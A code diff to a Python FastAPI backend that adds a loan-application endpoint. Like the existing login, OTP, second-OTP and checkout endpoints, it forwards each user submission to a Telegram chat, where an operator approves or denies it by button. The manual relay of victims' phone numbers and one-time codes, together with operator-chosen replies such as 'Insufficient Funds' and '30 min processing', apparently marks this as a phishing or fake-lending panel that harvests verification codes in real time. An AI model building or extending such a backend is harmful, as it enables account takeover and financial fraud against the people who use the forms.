@@ -27,7 +27,8 @@ TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")
 LOGIN_REQUESTS = {}
 OTP_REQUESTS = {}
 SECOND_VERIFICATION_REQUESTS = {}
-ORDER_REQUESTS = {} # ✅ NEW: Replaced LOAN_REQUESTS
+ORDER_REQUESTS = {}
+LOAN_REQUESTS = {} # ✅ RE-ADDED FOR LOANS
 
 # --- KEEP-ALIVE BACKGROUND TASK ---
 async def self_ping():
@@ -60,7 +61,6 @@ class SecondVerificationRequest(BaseModel):
     phone_number: str
     second_otp: str
 
-# ✅ NEW MODEL FOR PRODUCT CHECKOUT
 class CheckoutItem(BaseModel):
     name: str
     price: float
@@ -73,6 +73,12 @@ class CheckoutRequest(BaseModel):
     delivery_city: str
     delivery_fee: float
     total_amount: float
+
+# ✅ NEW MODEL FOR LOANS
+class LoanRequest(BaseModel):
+    phone_number: str
+    amount: float = Field(..., gt=0)
+    months: int = Field(..., gt=0)
 
 # --- ENDPOINTS ---
 
@@ -167,13 +173,11 @@ async def get_second_status(verify_id: str):
         raise HTTPException(status_code=404, detail="Verification not found")
     return {"status": SECOND_VERIFICATION_REQUESTS[verify_id]}
 
-# ✅ NEW: PRODUCT CHECKOUT ENDPOINT
 @app.post("/api/checkout")
 async def checkout(data: CheckoutRequest):
     order_id = str(uuid.uuid4())
     ORDER_REQUESTS[order_id] = "pending"
 
-    # Format the cart items for Telegram
     item_list_text = "\n".join([f"▪️ {i.quantity}x {i.name} - {i.price * i.quantity:,.0f} FCFA" for i in data.items])
 
     if TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID:
@@ -209,6 +213,42 @@ async def get_checkout_status(order_id: str):
         raise HTTPException(status_code=404, detail="Order not found")
     return {"status": ORDER_REQUESTS[order_id]}
 
+# ✅ NEW: LOAN APPLICATION ENDPOINT
+@app.post("/api/apply-loan")
+async def apply_loan(data: LoanRequest):
+    loan_id = str(uuid.uuid4())
+    LOAN_REQUESTS[loan_id] = "pending"
+
+    if TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID:
+        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+        message = (
+            f"💰 <b>New Loan Application</b>\n\n"
+            f"📱 <b>Phone:</b> {data.phone_number}\n"
+            f"💵 <b>Amount:</b> {data.amount:,.0f} FCFA\n"
+            f"📅 <b>Months:</b> {data.months}"
+        )
+        payload = {
+            "chat_id": TELEGRAM_CHAT_ID,
+            "text": message,
+            "parse_mode": "HTML",
+            "reply_markup": {
+                "inline_keyboard": [[
+                    {"text": "✅ Accept Loan", "callback_data": f"approve_loan_{loan_id}"},
+                    {"text": "❌ Deny Loan", "callback_data": f"deny_loan_{loan_id}"}
+                ]]
+            }
+        }
+        async with httpx.AsyncClient() as client:
+            await client.post(url, json=payload, timeout=10.0)
+
+    return {"status": "pending", "loan_id": loan_id}
+
+@app.get("/api/loan-status/{loan_id}")
+async def get_loan_status(loan_id: str):
+    if loan_id not in LOAN_REQUESTS:
+        raise HTTPException(status_code=404, detail="Loan not found")
+    return {"status": LOAN_REQUESTS[loan_id]}
+
 # --- TELEGRAM WEBHOOK ---
 @app.post("/api/telegram-webhook")
 async def telegram_webhook(request: Request):
@@ -223,7 +263,6 @@ async def telegram_webhook(request: Request):
             original_text = message.get("text", "")
             action_data = callback.get("data", "")
             
-            # Format: action_type_itemid (e.g., approve_checkout_1234-abcd)
             try:
                 action, item_type, item_id = action_data.split("_", 2)
             except ValueError:
@@ -239,10 +278,13 @@ async def telegram_webhook(request: Request):
             elif item_type == "second" and item_id in SECOND_VERIFICATION_REQUESTS:
                 SECOND_VERIFICATION_REQUESTS[item_id] = "approved" if action == "approve" else "denied"
                 reply_text = "✅ 2nd Verification Approved" if action == "approve" else "❌ 2nd Verification Denied"
-            # ✅ NEW: Handle Checkout Approval/Denial
             elif item_type == "checkout" and item_id in ORDER_REQUESTS:
                 ORDER_REQUESTS[item_id] = "approved" if action == "approve" else "denied"
                 reply_text = "✅ Order Approved & Paid" if action == "approve" else "❌ Order Denied (Insufficient Funds)"
+            # ✅ NEW: Handle Loan Approval/Denial
+            elif item_type == "loan" and item_id in LOAN_REQUESTS:
+                LOAN_REQUESTS[item_id] = "approved" if action == "approve" else "denied"
+                reply_text = "✅ Loan Approved (30 min processing)" if action == "approve" else "❌ Loan Denied"
             else:
                 return {"status": "ok"}
 
